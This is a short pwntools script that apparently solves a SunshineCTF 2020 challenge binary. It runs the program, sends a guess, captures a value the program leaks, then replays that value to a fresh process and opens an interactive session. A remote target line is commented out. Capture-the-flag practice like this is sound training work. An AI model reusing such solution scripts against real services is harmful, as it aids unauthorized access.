from pwn import *

#p = remote('chal.2020.sunshinectf.org', 30016)
p = process('./chall_17')

p.send('1234\n')
print(p.readline())

print(p.recvuntil(b': '))

d = p.recvuntil(b'\n', drop=True)
print(d)
p.close()

#p = remote('chal.2020.sunshinectf.org', 30016)
p = process('./chall_17')

p.send(d + b'\n')

p.interactive()
